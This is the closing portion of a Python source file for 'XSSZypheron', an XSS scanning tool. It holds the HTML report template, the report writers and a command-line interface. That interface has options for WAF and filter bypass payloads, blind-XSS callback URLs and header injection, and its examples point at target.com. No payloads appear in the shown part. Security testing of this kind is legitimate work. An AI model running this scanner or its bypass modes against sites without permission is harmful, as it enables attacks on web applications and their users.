body{{font-family:'Rajdhani',sans-serif;background:var(--bg);color:var(--tx);min-height:100vh;overflow-x:hidden}}
body::before{{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,232,74,.015) 3px,rgba(0,232,74,.015) 4px)}}
body::after{{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
  background:radial-gradient(ellipse 60% 40% at 15% 10%,rgba(232,20,58,.1),transparent),
             radial-gradient(ellipse 50% 35% at 85% 90%,rgba(0,232,74,.08),transparent)}}
 
/* ─ HEADER ─ */
.hdr{{position:relative;z-index:10;
  background:linear-gradient(135deg,#000 0%,#08000e 45%,#001208 100%);
  border-bottom:2px solid var(--drd);padding:30px 50px 26px;overflow:hidden}}
.hdr::after{{content:'';position:absolute;bottom:-1px;left:0;right:0;height:2px;
  background:linear-gradient(90deg,var(--drd),var(--rd),var(--gn),var(--dgn),var(--drd));
  background-size:200%;animation:flow 3s linear infinite}}
@keyframes flow{{0%{{background-position:0%}}100%{{background-position:200%}}}}
.hi{{position:relative;z-index:2;display:flex;align-items:center;justify-content:space-between;gap:20px}}
.lb{{display:flex;align-items:center;gap:18px}}
.aa{{font-family:'JetBrains Mono',monospace;font-size:7.5px;line-height:1.2;
  color:var(--rd);text-shadow:0 0 16px rgba(232,20,58,.5);white-space:pre;user-select:none}}
.tn{{font-family:'Orbitron',monospace;font-size:24px;font-weight:900;letter-spacing:2px;
  background:linear-gradient(90deg,var(--rd),var(--lrd),var(--gn));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}}
.ts{{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--tx3);
  letter-spacing:3px;text-transform:uppercase;margin-top:4px}}
.ta{{font-size:13px;font-weight:600;color:var(--gn);margin-top:5px;
  text-shadow:0 0 8px rgba(0,232,74,.4)}}
.hm{{text-align:right;font-family:'JetBrains Mono',monospace;font-size:10px;
  color:var(--tx3);line-height:2.2}}
.hm span{{color:var(--gn)}}
 
/* ─ STRIP ─ */
.strip{{position:relative;z-index:5;display:grid;grid-template-columns:repeat(7,1fr);
  background:var(--bg2);border-bottom:1px solid var(--b2)}}
.sc{{padding:16px 14px;border-right:1px solid var(--b2);transition:background .2s;
  position:relative;overflow:hidden}}
.sc::after{{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;
  background:var(--gn);transform:scaleX(0);transition:transform .3s;transform-origin:left}}
.sc:hover::after{{transform:scaleX(1)}}
.sc:hover{{background:rgba(0,232,74,.03)}}
.sc:last-child{{border-right:none}}
.sl{{font-family:'JetBrains Mono',monospace;font-size:8px;color:var(--tx3);
  text-transform:uppercase;letter-spacing:1.5px;margin-bottom:7px}}
.sv{{font-family:'Orbitron',monospace;font-size:26px;font-weight:700;
  font-variant-numeric:tabular-nums;line-height:1}}
.sv.r{{color:var(--rd);text-shadow:0 0 16px rgba(232,20,58,.4)}}
.sv.g{{color:var(--gn);text-shadow:0 0 14px rgba(0,232,74,.35)}}
.sv.d{{color:var(--tx3)}}
 
/* ─ RISK ─ */
.risk{{position:relative;z-index:5;padding:11px 50px;background:var(--bg3);
  border-bottom:1px solid var(--b2);display:flex;align-items:center;gap:16px}}
.rl{{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--tx3);
  white-space:nowrap;letter-spacing:1.5px}}
.rb{{flex:1;height:4px;background:var(--b3);border-radius:2px;overflow:hidden}}
.rf{{height:100%;border-radius:2px;
  background:linear-gradient(90deg,var(--gn),var(--yw),var(--rd));
  transition:width 1.4s ease}}
.rs{{font-family:'Orbitron',monospace;font-size:12px;font-weight:700;
  color:var(--lrd);text-shadow:0 0 8px var(--rd)}}
 
/* ─ TABS ─ */
.tabs{{position:relative;z-index:5;background:var(--bg2);
  border-bottom:1px solid var(--b2);padding:0 50px;display:flex}}
.tb{{padding:11px 18px;font-family:'JetBrains Mono',monospace;font-size:10px;
  font-weight:600;letter-spacing:1.2px;text-transform:uppercase;color:var(--tx3);
  background:none;border:none;border-bottom:2px solid transparent;
  cursor:pointer;transition:all .2s}}
.tb:hover{{color:var(--wh)}}
.tb.on{{color:var(--gn);border-bottom-color:var(--gn);text-shadow:0 0 6px rgba(0,232,74,.4)}}
.tc{{display:inline-flex;align-items:center;justify-content:center;
  width:16px;height:16px;border-radius:3px;font-size:9px;font-weight:700;
  margin-left:5px;font-family:'Orbitron',monospace}}
.tc.r{{background:var(--rd);color:#fff;box-shadow:0 0 5px var(--rd)}}
.tc.g{{background:var(--gn);color:#000;box-shadow:0 0 5px var(--gn)}}
.tc.d{{background:var(--b3);color:var(--tx3)}}
 
/* ─ MAIN ─ */
.main{{position:relative;z-index:5;padding:34px 50px 70px}}
.pnl{{display:none}}.pnl.on{{display:block}}
.sh{{display:flex;align-items:center;gap:14px;margin-bottom:18px}}
.st{{font-family:'Orbitron',monospace;font-size:10px;font-weight:700;
  letter-spacing:2px;text-transform:uppercase}}
.sl2{{flex:1;height:1px;background:linear-gradient(90deg,var(--b3),transparent)}}
.sc2{{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--tx3)}}
 
/* ─ OVERVIEW ─ */
.og{{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px}}
.oc{{background:var(--bg2);border:1px solid var(--b2);border-radius:6px;
  padding:18px;position:relative;overflow:hidden}}
.oc::before{{content:'';position:absolute;top:0;left:0;right:0;height:2px;
  background:linear-gradient(90deg,var(--rd),var(--gn))}}
.oc h3{{font-family:'Orbitron',monospace;font-size:8.5px;font-weight:700;
  letter-spacing:2px;text-transform:uppercase;color:var(--tx3);
  margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--b2)}}
.sr{{display:flex;align-items:center;gap:9px;padding:6px 0;border-bottom:1px solid var(--b1)}}
.sr:last-child{{border-bottom:none}}
.dot{{width:6px;height:6px;border-radius:2px;flex-shrink:0}}
.dot.h{{background:var(--rd);box-shadow:0 0 5px var(--rd)}}
.dot.m{{background:var(--yw)}}
.dot.l{{background:var(--tx3)}}
.sn{{font-size:13px;color:var(--tx);flex:1;font-weight:500}}
.sv2{{font-family:'Orbitron',monospace;font-size:13px;font-weight:700}}
.sv2.h{{color:var(--rd)}}.sv2.m{{color:var(--yw)}}.sv2.l{{color:var(--tx3)}}
.mr{{display:flex;justify-content:space-between;padding:6px 0;
  border-bottom:1px solid var(--b1);font-size:13px}}
.mr:last-child{{border-bottom:none}}
.mk{{color:var(--tx2);font-weight:500}}
.mv{{font-family:'JetBrains Mono',monospace;color:var(--gn)}}
.fpbox{{background:rgba(0,232,74,.05);border:1px solid var(--dgn);border-radius:4px;
  padding:10px 12px;margin-top:10px;font-family:'JetBrains Mono',monospace;
  font-size:10.5px;color:var(--gn)}}
 
/* ─ CARDS ─ */
.card{{border:1px solid var(--b2);border-radius:6px;margin-bottom:9px;
  overflow:hidden;transition:all .2s;position:relative}}
.card::before{{content:'';position:absolute;left:0;top:0;bottom:0;width:3px}}
.card:hover{{transform:translateX(4px)}}
.card.high{{background:var(--fh)}}.card.high::before{{background:var(--rd);box-shadow:0 0 6px var(--rd)}}
.card.medium{{background:var(--fm)}}.card.medium::before{{background:var(--yw)}}
.card.low{{background:var(--fl)}}.card.low::before{{background:var(--dgn)}}
.ch{{display:flex;align-items:center;justify-content:space-between;
  padding:11px 14px 11px 18px;cursor:pointer;gap:10px}}
.ch:hover{{background:rgba(255,255,255,.01)}}
.cl{{display:flex;align-items:center;gap:9px;min-width:0}}
.cr{{display:flex;align-items:center;gap:9px;flex-shrink:0}}
.badge{{font-family:'Orbitron',monospace;font-size:8px;font-weight:700;
  letter-spacing:1px;padding:3px 7px;border-radius:3px;text-transform:uppercase;flex-shrink:0}}
.badge.high{{background:rgba(232,20,58,.2);color:var(--lrd);border:1px solid rgba(232,20,58,.4)}}
.badge.medium{{background:rgba(255,165,0,.15);color:#ffcc44;border:1px solid rgba(255,165,0,.35)}}
.badge.low{{background:rgba(58,90,58,.2);color:var(--tx2);border:1px solid rgba(58,90,58,.4)}}
.vt{{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:600;
  color:var(--gn);text-shadow:0 0 5px rgba(0,232,74,.25)}}
.pm{{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--lrd);font-weight:600}}
.ctx{{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--tx3)}}
.vfy{{font-family:'JetBrains Mono',monospace;font-size:8.5px;font-weight:700;
  color:var(--gn);background:rgba(0,232,74,.1);border:1px solid rgba(0,232,74,.3);
  padding:2px 6px;border-radius:2px}}
.uvfy{{font-family:'JetBrains Mono',monospace;font-size:8.5px;font-weight:700;
  color:var(--yw);background:rgba(255,165,0,.1);border:1px solid rgba(255,165,0,.3);
  padding:2px 6px;border-radius:2px}}
.arr{{color:var(--tx3);font-size:11px;transition:transform .2s;cursor:pointer;user-select:none}}
.arr.open{{transform:rotate(180deg);color:var(--gn)}}
.cb{{padding:13px 18px;border-top:1px solid var(--b2)}}
.cb.hidden{{display:none}}
.g4{{display:grid;grid-template-columns:repeat(4,1fr);gap:9px;margin-bottom:10px}}
.fld{{display:flex;flex-direction:column;gap:3px;margin-top:7px}}
.fld label{{font-family:'Orbitron',monospace;font-size:7.5px;font-weight:700;
  letter-spacing:1.5px;text-transform:uppercase;color:var(--tx3)}}
.fld code{{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--tx);
  background:var(--bg);padding:5px 9px;border-radius:4px;
  border:1px solid var(--b2);word-break:break-all;line-height:1.55}}
.cu{{color:var(--gn)!important}}.cp{{color:var(--lrd)!important}}
.ce{{color:var(--tx2)!important;font-size:10px!important}}
.empty{{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--tx3);
  padding:36px;text-align:center;border:1px dashed var(--b3);border-radius:6px}}
 
/* ─ FOOTER ─ */
.ftr{{position:relative;z-index:5;padding:14px 50px;border-top:1px solid var(--b2);
  background:var(--bg2);display:flex;justify-content:space-between;align-items:center}}
.fl{{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--tx3)}}
.fl span{{color:var(--gn);text-shadow:0 0 5px rgba(0,232,74,.3)}}
.fr{{font-size:10px;color:var(--tx3)}}
::-webkit-scrollbar{{width:5px}}
::-webkit-scrollbar-track{{background:var(--bg)}}
::-webkit-scrollbar-thumb{{background:var(--b3);border-radius:3px}}
::-webkit-scrollbar-thumb:hover{{background:var(--drd)}}
@media(max-width:860px){{
  .hdr,.main,.ftr{{padding-left:14px;padding-right:14px}}
  .strip{{grid-template-columns:repeat(4,1fr)}}
  .tabs{{padding:0 14px;overflow-x:auto}}
  .risk{{padding:10px 14px}}
  .og{{grid-template-columns:1fr}}
  .aa{{display:none}}
  .g4{{grid-template-columns:repeat(2,1fr)}}
  .ftr{{flex-direction:column;gap:5px;text-align:center}}
}}
</style>
</head>
<body>
 
<header class="hdr">
  <div class="hi">
    <div class="lb">
      <div class="aa">██╗  ██╗███████╗███████╗
╚██╗██╔╝██╔════╝██╔════╝
 ╚███╔╝ ███████╗███████╗
 ██╔██╗ ╚════██║╚════██║
██╔╝ ██╗███████║███████║
╚═╝  ╚═╝╚══════╝╚══════╝</div>
      <div>
        <div class="tn">XSSZypheron</div>
        <div class="ts">XSS Detection &amp; Analysis Framework</div>
        <div class="ta">✦ Created by Prince Roy  ·  Zero False Positives Engine</div>
      </div>
    </div>
    <div class="hm">
      <div>SCAN DATE &nbsp;<span>{ts}</span></div>
      <div>VERSION &nbsp;<span>1.0</span></div>
      <div>VERIFIED FINDINGS &nbsp;<span>{len(fl)}</span></div>
      <div>FP AVOIDED &nbsp;<span>{s.fp_avoided}</span></div>
    </div>
  </div>
</header>
 
<div class="strip">
  <div class="sc"><div class="sl">Total</div><div class="sv {'r' if fl else 'd'}">{len(fl)}</div></div>
  <div class="sc"><div class="sl">High</div><div class="sv {'r' if hi else 'd'}">{len(hi)}</div></div>
  <div class="sc"><div class="sl">Medium</div><div class="sv {'r' if me else 'd'}">{len(me)}</div></div>
  <div class="sc"><div class="sl">Low</div><div class="sv d">{len(lo)}</div></div>
  <div class="sc"><div class="sl">FP Avoided</div><div class="sv g">{s.fp_avoided}</div></div>
  <div class="sc"><div class="sl">Payloads</div><div class="sv g">{s.sent}</div></div>
  <div class="sc"><div class="sl">Elapsed</div><div class="sv d">{s.elapsed()}</div></div>
</div>
 
<div class="risk">
  <span class="rl">RISK LEVEL</span>
  <div class="rb"><div class="rf" id="rf" style="width:0%"></div></div>
  <span class="rs">{rl}</span>
</div>
 
<div class="tabs">
  <button class="tb on" onclick="sw('ov',this)">Overview</button>
  <button class="tb" onclick="sw('hi',this)">High <span class="tc {'r' if hi else 'd'}">{len(hi)}</span></button>
  <button class="tb" onclick="sw('me',this)">Medium <span class="tc d">{len(me)}</span></button>
  <button class="tb" onclick="sw('lo',this)">Low <span class="tc d">{len(lo)}</span></button>
  <button class="tb" onclick="sw('al',this)">All <span class="tc {'g' if fl else 'd'}">{len(fl)}</span></button>
</div>
 
<main class="main">
  <div id="t-ov" class="pnl on">
    <div class="og">
      <div class="oc">
        <h3>Severity Breakdown</h3>
        <div class="sr"><div class="dot h"></div><span class="sn">High</span><span class="sv2 h">{len(hi)}</span></div>
        <div class="sr"><div class="dot m"></div><span class="sn">Medium</span><span class="sv2 m">{len(me)}</span></div>
        <div class="sr"><div class="dot l"></div><span class="sn">Low</span><span class="sv2 l">{len(lo)}</span></div>
      </div>
      <div class="oc">
        <h3>Scan Statistics</h3>
        <div class="mr"><span class="mk">URLs Scanned</span><span class="mv">{s.urls}</span></div>
        <div class="mr"><span class="mk">Forms Found</span><span class="mv">{s.forms}</span></div>
        <div class="mr"><span class="mk">Params Tested</span><span class="mv">{s.params}</span></div>
        <div class="mr"><span class="mk">Payloads Sent</span><span class="mv">{s.sent}</span></div>
        <div class="mr"><span class="mk">Errors</span><span class="mv">{s.errors}</span></div>
        <div class="mr"><span class="mk">Duration</span><span class="mv">{s.elapsed()}</span></div>
      </div>
      <div class="oc">
        <h3>Authenticity Engine</h3>
        <div class="mr"><span class="mk">FP Avoided</span><span class="mv">{s.fp_avoided}</span></div>
        <div class="mr"><span class="mk">Verification</span><span class="mv">Double-Pass</span></div>
        <div class="mr"><span class="mk">Baseline Check</span><span class="mv">Active</span></div>
        <div class="mr"><span class="mk">Encode Detection</span><span class="mv">Active</span></div>
        <div class="mr"><span class="mk">Trigger Integrity</span><span class="mv">Active</span></div>
        <div class="fpbox">✓ {s.fp_avoided} false positives detected and suppressed</div>
      </div>
    </div>
  </div>
  <div id="t-hi" class="pnl">
    <div class="sh"><span class="st" style="color:var(--lrd)">High Severity</span>
    <div class="sl2"></div><span class="sc2">{len(hi)} findings</span></div>
    {cards(hi)}
  </div>
  <div id="t-me" class="pnl">
    <div class="sh"><span class="st" style="color:var(--yw)">Medium Severity</span>
    <div class="sl2"></div><span class="sc2">{len(me)} findings</span></div>
    {cards(me)}
  </div>
  <div id="t-lo" class="pnl">
    <div class="sh"><span class="st" style="color:var(--tx2)">Low Severity</span>
    <div class="sl2"></div><span class="sc2">{len(lo)} findings</span></div>
    {cards(lo)}
  </div>
  <div id="t-al" class="pnl">
    <div class="sh"><span class="st" style="color:var(--gn)">All Findings</span>
    <div class="sl2"></div><span class="sc2">{len(fl)} total</span></div>
    {cards(fl)}
  </div>
</main>
 
<footer class="ftr">
  <div class="fl">XSSZypheron v1.0 &nbsp;·&nbsp; <span>Created by Prince Roy</span> &nbsp;·&nbsp; Authorized Testing Only</div>
  <div class="fr">Generated: {ts}</div>
</footer>
 
<script>
function sw(id,btn){{
  document.querySelectorAll('.pnl').forEach(p=>p.classList.remove('on'));
  document.querySelectorAll('.tb').forEach(b=>b.classList.remove('on'));
  document.getElementById('t-'+id).classList.add('on');
  btn.classList.add('on');
}}
function tog(ch){{
  var cb=ch.nextElementSibling,ar=ch.querySelector('.arr');
  if(cb)cb.classList.toggle('hidden');
  if(ar)ar.classList.toggle('open');
}}
window.addEventListener('load',function(){{
  setTimeout(function(){{document.getElementById('rf').style.width='{rp}%';}},150);
}});
</script>
</body>
</html>"""
 
    # ══════════════════════════════════════════════════════════
    #  REPORT ENTRY
    # ══════════════════════════════════════════════════════════
    def report(self, output=None, fmt="text", html_output=None):
        self._console_report()
        if output:
            if fmt == "json":
                data = {
                    "meta": {
                        "tool": "XSSZypheron", "author": "Prince Roy",
                        "timestamp": datetime.utcnow().isoformat(),
                        "urls_scanned": self.stats.urls,
                        "payloads_sent": self.stats.sent,
                        "fp_avoided": self.stats.fp_avoided,
                    },
                    "findings": [asdict(f) for f in self.findings],
                }
                Path(output).write_text(json.dumps(data, indent=2), encoding="utf-8")
            else:
                lines = [
                    "XSSZypheron Scan Report", "Created by Prince Roy",
                    f"Timestamp: {datetime.now()}", "",
                    f"URLs: {self.stats.urls}  Payloads: {self.stats.sent}"
                    f"  FP avoided: {self.stats.fp_avoided}",
                    f"Findings: {self.stats.hits}", "─"*60,
                ] + [
                    f"\n#{i} [{f.severity}] {f.vuln_type} | {f.parameter} | {f.context}"
                    f"\n  URL: {f.url}\n  Payload: {f.payload}"
                    for i, f in enumerate(self.findings, 1)
                ]
                Path(output).write_text("\n".join(lines), encoding="utf-8")
            print(C.ok(f"Report saved  → {output}"))
        if html_output:
            Path(html_output).write_text(self._html_report(), encoding="utf-8")
            print(C.ok(f"HTML report   → {html_output}"))
 
# ══════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════
def build_parser():
    p = argparse.ArgumentParser(
        prog="xsszypheron",
        description="XSSZypheron — XSS Framework | Created by Prince Roy",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Examples:
  xsszypheron.py -u "https://target.com/page?q=test" -v
  xsszypheron.py -u "https://target.com" -c waf_bypass,filter_bypass --dom -v --html r.html
  xsszypheron.py -f urls.txt -t 10 --format json -o out.json --html report.html
  xsszypheron.py -u "https://target.com" --cookie "s=abc" --proxy http://127.0.0.1:8080 -v""")
 
    tgt = p.add_argument_group("Target")
    tgt.add_argument("-u","--url",  help="Single URL to scan")
    tgt.add_argument("-f","--file", help="File with one URL per line")
 
    pay = p.add_argument_group("Payloads")
    pay.add_argument("-p","--payloads",   metavar="FILE", help="Custom payload file")
    pay.add_argument("-c","--categories", metavar="CATS",
                     help="basic, attribute, filter_bypass, waf_bypass, polyglot")
    pay.add_argument("--blind-url", metavar="URL", help="Blind XSS callback URL")
 
    mode = p.add_argument_group("Modes")
    mode.add_argument("--dom",              action="store_true", help="DOM sink static analysis")
    mode.add_argument("--scan-headers",     action="store_true", help="Inject into HTTP headers")
    mode.add_argument("--continue-on-find", action="store_true", help="Keep testing after first hit")
 
    http = p.add_argument_group("HTTP")
    http.add_argument("--cookie",        help="Cookie string")
    http.add_argument("--cookie-jar",    metavar="FILE")
    http.add_argument("--auth",          metavar="USER:PASS")
    http.add_argument("-H","--header",   action="append", dest="headers", default=[], metavar="HDR")
    http.add_argument("--proxy",         help="Proxy URL")
    http.add_argument("--user-agent",    help="Custom User-Agent")
    http.add_argument("--timeout",       type=float, default=10)
    http.add_argument("--no-ssl-verify", action="store_true")
    http.add_argument("--delay",         type=float, default=0)
 
    perf = p.add_argument_group("Performance")
    perf.add_argument("-t","--threads", type=int, default=5)
 
    out = p.add_argument_group("Output")
    out.add_argument("-o","--output", metavar="FILE")
    out.add_argument("--format",      choices=["text","json"], default="text")
    out.add_argument("--html",        metavar="FILE", help="HTML report output file")
    out.add_argument("-v","--verbose", action="store_true",
                     help="Show every payload attempt + result live")
    return p
 
def main():
    show_banner()
    parser = build_parser()
    args   = parser.parse_args()
 
    if not args.url and not args.file:
        parser.print_help(); sys.exit(1)
 
    urls = []
    if args.url: urls.append(args.url.strip())
    if args.file:
        try:
            urls += [l.strip() for l in Path(args.file).read_text().splitlines()
                     if l.strip() and not l.startswith("#")]
        except FileNotFoundError:
            print(C.err(f"File not found: {args.file}")); sys.exit(1)
 
    cats = [c.strip() for c in args.categories.split(",")] if args.categories else []
 
    cfg = {
        "threads": args.threads, "timeout": args.timeout,
        "payload_file": args.payloads, "payload_categories": cats,
        "blind_url": args.blind_url, "dom": args.dom,
        "scan_headers": args.scan_headers, "continue_on_find": args.continue_on_find,
        "cookie": args.cookie, "cookie_jar": args.cookie_jar,
        "auth": args.auth, "headers": args.headers,
        "proxy": args.proxy, "user_agent": args.user_agent,
        "no_ssl_verify": args.no_ssl_verify, "delay": args.delay,
        "verbose": args.verbose,
    }
 
    G=C.G; R=C.RS; W=C.WH; DR=C.DR; LG=C.LG
    print(f"{DR}  {'─'*52}{R}")
    print(f"  {LG}►{R} {W}Threads    :{R} {G}{C.BD}{args.threads}{R}")
    print(f"  {LG}►{R} {W}Timeout    :{R} {G}{args.timeout}s{R}")
    print(f"  {LG}►{R} {W}Targets    :{R} {G}{C.BD}{len(urls)}{R}")
    print(f"  {LG}►{R} {W}Verbose    :{R} {G if args.verbose else C.GR}{args.verbose}{R}")
    print(f"  {LG}►{R} {W}DOM Scan   :{R} {G if args.dom else C.GR}{args.dom}{R}")
    print(f"  {LG}►{R} {W}Hdr Inject :{R} {G if args.scan_headers else C.GR}{args.scan_headers}{R}")
    print(f"  {LG}►{R} {W}HTML Report:{R} {G}{args.html or 'disabled'}{R}")
    print(f"  {LG}►{R} {W}Started    :{R} {G}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{R}")
    print(f"{DR}  {'─'*52}{R}\n")
 
    scanner = XSSZypheron(cfg)
    scanner.run(urls)
    scanner.report(output=args.output, fmt=args.format, html_output=args.html)
 
if __name__ == "__main__":
    main()
